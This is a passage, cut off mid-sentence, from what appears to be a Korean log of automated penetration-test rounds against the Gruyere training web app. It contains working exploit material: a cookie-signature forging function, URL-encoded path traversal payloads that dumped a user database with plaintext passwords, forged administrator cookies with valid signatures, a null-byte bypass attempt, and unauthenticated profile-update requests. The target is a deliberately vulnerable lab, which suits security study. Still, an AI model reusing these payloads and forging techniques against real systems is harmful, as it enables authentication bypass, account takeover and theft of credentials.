서명 재현(Python 2.7 `str.__hash__` 를 파이썬3로 재구현, 64비트 부호 wrap 포함):
```python
def py2_hash(s):
    if not s: return 0
    x = ord(s[0]) << 7
    for ch in s: x = ((1000003 * x) ^ ord(ch)) & ((1<<64)-1)
    x = (x ^ len(s)) & ((1<<64)-1)
    return x - (1<<64) if x >= 1<<63 else x
sign = py2_hash("Cookie!\n" + cookie_data) & 0x7FFFFFF
```

**3. 결과**
- **경로이탈 읽기 성공**. 평문 `../`(1~3단계)·`%2e%2e/`·`.%2e/` 는 Google Frontend 가
  302 로 정규화해 차단했지만, **`%2e%2e%2f`(슬래시까지 인코딩)와 `..%2f` 는 통과**했다
  (앱은 `urllib.unquote` 후 `resources/` 기준으로 그대로 open).
  - `GET /%2e%2e%2fsecret.txt` → 200, `content-type: text/plain`, 본문 `Cookie!\n` (8바이트)
  - `GET /%2e%2e%2fstored-data.txt` → 200, 1144바이트 **픽클 DB 원문 전체**
    (cheddar/pw=orange, administrator/pw=secret, sardo/pw=odras, brie/pw=briebrie 와
    private_snippet 전부 평문)
  - `GET /../README` → 200 (확장자 없는 파일은 text/plain 으로 허용)
- **서명 스킴 규명 성공**: `py2_hash(cookie_secret + cookie_data) & 0x7FFFFFF`,
  `cookie_secret = "Cookie!\n"`. 알려진 4쌍에 대해 **4/4 일치**
  (`brie||author`=74315992, `administrator|admin|`=31131337, `cheddar||author`=40461140,
  `sardo||author`=22005508). 서명은 3개 인스턴스에서 동일 → 인스턴스 무관 전역 시크릿.
- **인증 완전 우회 실증(읽기 전용 GET)**:
  - `Cookie: GRUYERE=72819616|brie|admin|author` → 서버가
    `{'is_admin': True, 'is_author': True, 'uid': u'brie'}` 로 파싱, `/manage.gtl` 관리자
    링크·`/newaccount.gtl` 의 `is_admin` 라디오·`/editprofile.gtl` 관리자 전용 UI 전부 노출
  - `Cookie: GRUYERE=65692386|administrator|admin|author` → **자격증명 없이 administrator
    신원으로 인식**(`uid: u'administrator'`, is_admin True)
  - 대조군 `GRUYERE=36184618|administrator||author`(is_admin 빈 값) → `is_admin: False`,
    관리자 UI 미노출 → **플래그가 내가 넣은 값에서 온다는 인과관계 확인**
- 확장자 화이트리스트(`RESOURCE_CONTENT_TYPES`) 때문에 `.py`/`.yaml`/`.bak` 은
  "Unrecognized file type" 으로 열기 전 차단 → 소스/설정 파일 직접 열람은 실패.
  널바이트 우회(`data.py%00.txt`)도 실패했으나 **다른 결과**를 냈다:
  ```

  <TT>Exception: file() argument 1 must be encoded string without null bytes, not str</TT>
  ```

## Round 8 — 2026-09-28T10:22:20Z (exploit) · phase 2 / 3라운드

**1. 추론 근거**
Round 7 후 남은 후보 중 Jev 2순위는 CSRF(0.38)였다. CSRF 실증을 준비하다(로컬 공격자 페이지 +
`<img>`/top-level nav) **그 전제를 먼저 확인하는 게 맞다고 판단**했다 — "상태변경이 GET이고
CSRF 토큰이 없다"는 것은 **쿠키가 실려야** 성립하는 이야기인데, `_DoSaveprofile` 소스를 다시
읽어보니 애초에 **인증 검사가 없을 가능성**이 보였다:

```python
uid = self._GetParameter(params, 'uid', cookie[COOKIE_UID])   # uid 는 요청 파라미터 우선
...
elif action == 'update':
  if uid not in database: message = 'User does not exist.'
  elif (newpw and database[uid]['pw'] != self._GetParameter(params,'oldpw')
        and not cookie.get(COOKIE_ADMIN)):
    message = 'Incorrect password.'
  else:
    database[uid].update(profile_data)     # ← 인증 검사 없음
```
분기 조건이 `newpw and ...` 이므로 **`pw` 파라미터를 주지 않으면 두 번째 조건 자체가 거짓**
→ `else` 로 직행해 `database[uid].update(profile_data)`. 그리고 `uid` 는 파라미터가 우선이다.
즉 **쿠키 없이도** 임의 계정의 8개 필드를 바꿀 수 있다. CSRF 는 "쿠키를 실어 보내는" 문제인데
그럴 필요조차 없으므로, CSRF 실증은 상위 발견에 흡수된다 → 로컬 공격자 페이지/서버를
준비만 하고 실제 CSRF 시나리오는 실행하지 않았다(자원 절약, 아래 4. 참고).

  쿠키 없이 `action=update&uid=brie&private_snippet=NOAUTH-PROOF` → **302**. 덤프를
